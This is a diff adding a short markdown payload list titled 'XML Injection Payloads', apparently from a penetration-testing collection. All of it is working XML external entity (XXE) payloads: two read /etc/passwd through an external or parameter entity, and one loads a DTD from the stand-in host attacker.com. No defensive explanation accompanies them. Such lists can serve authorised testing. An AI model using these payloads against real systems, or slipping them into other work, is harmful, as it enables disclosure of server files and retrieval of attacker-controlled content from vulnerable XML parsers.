@@ -1,0 +1,21 @@
+# XML Injection Payloads
+
+## Basic XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+
+## External Entity
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">
+]>
+
+## Parameter Entity
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+%xxe;
+]>
